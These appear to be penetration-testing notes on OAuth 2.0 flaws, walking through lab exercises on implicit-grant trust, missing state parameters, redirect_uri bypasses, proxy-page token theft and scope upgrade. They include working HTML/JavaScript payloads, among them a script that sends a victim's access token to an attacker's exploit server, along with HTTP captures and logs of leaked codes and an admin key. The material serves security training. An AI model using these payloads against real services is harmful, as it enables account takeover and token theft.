# Enumeration

Once you know the hostname of the authorization server, you should always try sending a `GET` request to the following **standard endpoints**:

-   `/.well-known/oauth-authorization-server`
-   `/.well-known/openid-configuration`

These will often return a JSON configuration file containing key information, such as details of additional features that may be supported. 

# Common vulnerabilities

Vulnerabilities can arise in the client application's implementation of OAuth as well as in the configuration of the OAuth service itself.

## Improper implementation of the implicit grant type

When application uses [Implicit grant type](OAuth%202.0.md#Implicit%20grant%20type) as authentication mechanism, the access token is sent from the OAuth service to the client application via the user's browser as a URL fragment. The client application then accesses the token using JavaScript. 

The trouble is, if the application wants to maintain the session after the user closes the page, it needs to store the current user data (normally a user ID and the access token) somewhere.

To solve this problem, the client application will often submit this data to the server in a `POST` request and then assign the user a session cookie. In this scenario, the server does not have any secrets or passwords to compare with the submitted data, which means that it is implicitly trusted.

In the implicit flow, this `POST` request is exposed to attackers via their browser. As a result, this behavior can lead to a serious vulnerability if the client application doesn't properly check that the access token matches the other data in the request.

OAuth `access_token`:
```http
GET /auth/2MRX0ljI69au_MND166uD HTTP/2
Host: oauth-0a3b00a404da08d581df370102d10001.oauth-server.net
Cookie: _interaction_resume=2MRX0ljI69au_MND166uD; _session=tU09Uzi1mPBeQDBquaEcA; _session.legacy=tU09Uzi1mPBeQDBquaEcA


HTTP/2 302 Found
Location: https://0a9200f004470809819239f700b900a7.web-security-academy.net/oauth-callback#access_token=48w8D_rPH_OAfW1-7WCVd_KSHtYDOWY70PLDCiay6si&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email

Redirecting to <a href="https://0a9200f004470809819239f700b900a7.web-security-academy.net/oauth-callback#access_token=48w8D_rPH_OAfW1-7WCVd_KSHtYDOWY70PLDCiay6si&amp;expires_in=3600&amp;token_type=Bearer&amp;scope=openid%20profile%20email">https://0a9200f004470809819239f700b900a7.web-security-academy.net/oauth-callback#access_token=48w8D_rPH_OAfW1-7WCVd_KSHtYDOWY70PLDCiay6si&amp;expires_in=3600&amp;token_type=Bearer&amp;scope=openid%20profile%20email</a>.
```

`/oauth-callback` extracts the `access_token` and authenticate the user:
```js
...
const urlSearchParams = new URLSearchParams(window.location.hash.substr(1));
const token = urlSearchParams.get('access_token');
fetch('https://oauth-0a3b00a404da08d581df370102d10001.oauth-server.net/me', {
    method: 'GET',
    headers: {
        'Authorization': 'Bearer ' + token,
        'Content-Type': 'application/json'
    }
})
.then(r => r.json())
.then(j => 
    fetch('/authenticate', {
        method: 'POST',
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        },
...
```

```http
GET /me HTTP/2
Host: oauth-0a3b00a404da08d581df370102d10001.oauth-server.net
Authorization: Bearer 48w8D_rPH_OAfW1-7WCVd_KSHtYDOWY70PLDCiay6si

HTTP/2 200 OK
{"sub":"wiener","name":"Peter Wiener","email":"wiener@hotdog.com","email_verified":true}

---

POST /authenticate HTTP/2
Host: 0a9200f004470809819239f700b900a7.web-security-academy.net

{"email":"wiener@hotdog.com","username":"wiener","token":"48w8D_rPH_OAfW1-7WCVd_KSHtYDOWY70PLDCiay6si"}


HTTP/2 302 Found
Location: /
Set-Cookie: session=3K8mkVVmZu4PS7yXCxRdYbp8DggDwUhM; Secure; HttpOnly; SameSite=None
```

Used a valid access token and obtained a session cookie for another existing user:
```http
POST /authenticate HTTP/2
Host: 0a9200f004470809819239f700b900a7.web-security-academy.net

{"email":"carlos@carlos-montoya.net","username":"carlos","token":"48w8D_rPH_OAfW1-7WCVd_KSHtYDOWY70PLDCiay6si"}


HTTP/2 302 Found
Location: /
Set-Cookie: session=WV7jzAGDYK9SBwX0D2foyLoJpTX2GHmH; Secure; HttpOnly; SameSite=None
```

## Flawed CSRF protection

The `state` parameter should ideally contain an unguessable value, such as the hash of something tied to the user's session when it first initiates the OAuth flow. This value is then passed back and forth between the client application and the OAuth service as a form of [CSRF token](Session%20Attacks%20(CSRF,%20session%20stealing,%20etc.).md#CSRF%20tokens) for the client application. It it is not included in the authorization request, it can potentially means that attackers can initiate an OAuth flow themselves before tricking a user's browser into completing it, like in  [Cross-Site Request Forgery (CSRF)](Session%20Attacks%20(CSRF,%20session%20stealing,%20etc.).md#Cross-Site%20Request%20Forgery%20(CSRF)) attacks.

AOuth request:
```http
GET /auth?client_id=o9a47mrb8phzw2zind5vr&redirect_uri=https://0a7100fe03e306068320e2fc001d0093.web-security-academy.net/oauth-linking&response_type=code&scope=openid%20profile%20email HTTP/2
Host: oauth-0ad0006b03d7061683b0e006020b0092.oauth-server.net


HTTP/2 302 Found
Location: https://0a7100fe03e306068320e2fc001d0093.web-security-academy.net/oauth-linking?code=FtD94zhZ92lW7Dxb0a0XkLtWkUoQ272nPKUpYY7czGs
...
Redirecting to <a href="https://0a7100fe03e306068320e2fc001d0093.web-security-academy.net/oauth-linking?code=FtD94zhZ92lW7Dxb0a0XkLtWkUoQ272nPKUpYY7czGs">https://0a7100fe03e306068320e2fc001d0093.web-security-academy.net/oauth-linking?code=FtD94zhZ92lW7Dxb0a0XkLtWkUoQ272nPKUpYY7czGs</a>
```

Link request:
```http
GET /oauth-linking?code=FtD94zhZ92lW7Dxb0a0XkLtWkUoQ272nPKUpYY7czGs HTTP/2
Host: 0a7100fe03e306068320e2fc001d0093.web-security-academy.net
Cookie: session=xviiUUJRMIFclflsFPxXEfMLMh8hcJ5G
```

We can create an arbitrary profile-linking request and then send it to the user to link our social-account to the victim's application one:
```html
<script> document.location = 'https://0a7100fe03e306068320e2fc001d0093.web-security-academy.net/oauth-linking?code=rGBIs9Af4Mu_nAKiSaROttSpe8Oc1MKdnsBaD5L0VgY'; </script>
```

In this way, the next time we access the application using our social profile, we will be the victim (since it were linked)

## Leaking authorization codes and access tokens

By stealing a valid code or token, the attacker may be able to access the victim's data. Ultimately, this can completely compromise their account - the attacker could potentially log in as the victim user on any client application that is registered with this OAuth service.

Depending on the grant type, either a code or token is sent via the victim's browser to the `/callback` endpoint specified in the `redirect_uri` parameter of the authorization request. If the OAuth service fails to validate this URI properly, an attacker may be able to construct a CSRF-like attack conjuncted with an [Open Redirection](Open%20Redirection.md), tricking the victim's browser into initiating an OAuth flow that will send the code or token to an attacker-controlled `redirect_uri`.

PoC containing a `redirect_url` controlled by the attacker:
```html
<script>
document.location = 'https://oauth-0aea002e04b55c768637b4e102c200a9.oauth-server.net/auth?client_id=kwcs8f4d6j85i7t26hjqe&redirect_uri=https://exploit-0a2700b504fc5ce58660b5a3014b00ab.exploit-server.net/leak&response_type=code&scope=openid%20profile%20email';
</script>
```

Leaked administrator code:
```
10.0.4.92       2023-04-20 15:42:31 +0000 "GET /leak?code=svze7qEtB1chzoupR2xPPt1264BFiPBHlP085n3t5XI HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
```

Sent the secret code to the `/callback` function and obtained a valid session cookie:
```http
GET /oauth-callback?code=svze7qEtB1chzoupR2xPPt1264BFiPBHlP085n3t5XI HTTP/2
Host: 0a1200a904c75c9186bbb696002f00c8.web-security-academy.net


HTTP/2 200 OK
Set-Cookie: session=UzautQP5DWmLraPPTYOpT7HrIpSQ9Jpk; Secure; HttpOnly; SameSite=None
```

## Flawed redirect_uri validation

It is best practice for client applications to provide a whitelist of their genuine callback URIs when registering with the OAuth service. This way, when the OAuth service receives a new request, it can validate the `redirect_uri` parameter against this whitelist. In this case, supplying an external URI will likely result in an error. However, there may still be ways to bypass this validation.

When auditing an OAuth flow, you should try experimenting with the `redirect_uri` parameter to understand how it is being validated.

- [SSRF evasion and bypasses](Server%20Side%20Request%20Forgery%20(SSRF).md#SSRF%20evasion%20and%20bypasses)
- [CORS based attacks](CORS%20based%20attacks.md)
- [Evading Restrictions](Evading%20Restrictions.md)
- [HTTP Parameter Pollution (HPP)](HTTP%20Parameter%20Pollution%20(HPP).md) 

>[!tip]
>It is important to note that you shouldn't limit your testing to just probing the `redirect_uri` parameter in isolation. In the wild, you will often need to experiment with different combinations of changes to several parameters. Sometimes changing one parameter can affect the validation of others. For example, changing the `response_mode` from `query` to `fragment` can sometimes completely alter the parsing of the `redirect_uri`, allowing you to submit URIs that would otherwise be blocked. Likewise, if you notice that the `web_message` response mode is supported, this often allows a wider range of subdomains in the `redirect_uri`.

## Stealing secrets via a proxy page

Against more robust targets, you might find that no matter what you try, you are unable to successfully submit an external domain as the `redirect_uri`. The key now is to use this knowledge to try and access a wider attack surface within the client application itself. Try to work out whether you can change the `redirect_uri` parameter to point to any other pages on a whitelisted domain.

Once you identify which other pages you are able to set as the redirect URI, you should audit them for additional vulnerabilities that you can potentially use to leak the code or token:
- [Authorization code grant type](OAuth%202.0.md#Authorization%20code%20grant%20type): find a vulnerability that gives you access to the query parameters
- [Implicit grant type](OAuth%202.0.md#Implicit%20grant%20type): extract the URL fragment

One of the most useful vulnerabilities for this purpose is an [Open Redirection](Open%20Redirection.md). You can use this as a proxy to forward victims, along with their code or token, to an attacker-controlled domain where you can host any malicious script you like. Other good candidates are [Cross-Site Scripting (XSS)](Cross-Site%20Scripting%20(XSS).md), HTML injection and Dangerous JavaScript that handles query parameters and URL fragments.

Detected a page vulnerable to open redirection:
```http
GET /post/next?path=https://foo.bar HTTP/2
Host: 0ac60016030f6c3d81b6da3400e900d1.web-security-academy.net
Referer: https://0ac60016030f6c3d81b6da3400e900d1.web-security-academy.net/post?postId=6


HTTP/2 302 Found
Location: https://foo.bar
```

Detected a misconfiguration in the `redirect_uri` check:
```http
GET /auth?client_id=tt3v2o2jnsioh04ajnvl8&redirect_uri=https://0ac60016030f6c3d81b6da3400e900d1.web-security-academy.net/post/next?path=https://exploit-0a0c002903af6c5e814fd992016e00b9.exploit-server.net/exploit&response_type=token&nonce=744981384&scope=openid%20profile%20email HTTP/2
Host: oauth-0a90009f03986ca381a6d814024b0065.oauth-server.net


HTTP/2 400 Bad Request
<h1>oops! something went wrong</h1>
<pre><strong>error</strong>: redirect_uri_mismatch</pre><pre><strong>error_description</strong>: redirect_uri did not match any of the client&#39;s registered redirect_uris</pre>

---

GET /auth?client_id=tt3v2o2jnsioh04ajnvl8&redirect_uri=https://0ac60016030f6c3d81b6da3400e900d1.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a0c002903af6c5e814fd992016e00b9.exploit-server.net/exploit&response_type=token&nonce=744981384&scope=openid%20profile%20email HTTP/2
Host: oauth-0a90009f03986ca381a6d814024b0065.oauth-server.net


HTTP/2 302 Found
Redirecting to <a href="/interaction/J3Ht8WP1UtEZ9zwv9f7td">/interaction/J3Ht8WP1UtEZ9zwv9f7td</a>
```

PoC that exploit the open redirection to starts the OAuth authentication and then exfiltrate the leaked `access_token`:

```html
<script>
if(window.location.hash.substr(1)){
    urlSearchParams = new URLSearchParams(window.location.hash.substr(1));
    token = urlSearchParams.get('access_token');
    fetch('https://exploit-0a0c002903af6c5e814fd992016e00b9.exploit-server.net/exfil?'+token, {});
}else{
    document.location="https://oauth-0a90009f03986ca381a6d814024b0065.oauth-server.net/auth?client_id=tt3v2o2jnsioh04ajnvl8&redirect_uri=https://0ac60016030f6c3d81b6da3400e900d1.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a0c002903af6c5e814fd992016e00b9.exploit-server.net/exploit&response_type=token&nonce=744981384&scope=openid%20profile%20email";
}
</script>

Logs:
10.0.3.108      2023-04-23 14:00:18 +0000 "GET /exploit/ HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
10.0.3.108      2023-04-23 14:00:18 +0000 "GET /exploit HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
10.0.3.108      2023-04-23 14:00:18 +0000 "GET /exfil?V9yRIZO8JDGM065wyFjh5y0StnRGa2b6oaJHlSDwGkQ HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
```

Leaked admin secrets:
```http
GET /me HTTP/2
Host: oauth-0a90009f03986ca381a6d814024b0065.oauth-server.net
Authorization: Bearer V9yRIZO8JDGM065wyFjh5y0StnRGa2b6oaJHlSDwGkQ


HTTP/2 200 OK
Access-Control-Allow-Origin: https://0ac60016030f6c3d81b6da3400e900d1.web-security-academy.net
Access-Control-Expose-Headers: WWW-Authenticate

{"sub":"administrator","apikey":"S1A7R0ucaT9nJ3J3xE9I29EFbl3nInvi","name":"Administrator","email":"administrator@normal-user.net","email_verified":true}
```

## Scope upgrade

In any OAuth flow, the user must approve the requested access based on the scope defined in the authorization request. The resulting token allows the client application to access **only the scope that was approved by the user**. But in some cases, it may be possible for an attacker to "**upgrade**" an access token with extra permissions.

### authorization code flow

The user's data is requested and sent via secure server-to-server communication. However, it may still be possible to manipulate the requested data by registering your own client application with the OAuth service.

1. Attacker's malicious client application initially requested access to the user's email address using the `openid email` scope:
2. After the user approves this request, the malicious client application receives an authorization code.
3. As the attacker controls their client application, they can add another `scope` parameter to the code/token exchange request containing the additional `profile` scope
```http
POST /token
Host: oauth-authorization-server.com
…
client_id=12345&client_secret=SECRET&redirect_uri=https://client-app.com/callback&grant_type=authorization_code&code=a1b2c3d4e5f6g7h8&scope=openid%20 email%20profile
```
4. If the server does not validate this against the scope from the initial authorization request, it will sometimes generate an access token using the new scope
```json
{ "access_token": "z0y9x8w7v6u5", "token_type": "Bearer", "expires_in": 3600, "scope": "openid email profile", … }
```
5. The attacker can then use their application to make the necessary API calls to access the user's profile data.

### implicit flow

The access token is sent via the browser, which means an attacker can steal tokens associated with innocent client applications and use them directly. Once they have stolen an access token, they can send a normal browser-based request to the OAuth service's `/userinfo` endpoint, manually adding a new `scope` parameter in the process.

Ideally, the OAuth service should validate this `scope` value against the one that was used when generating the token, but this isn't always the case.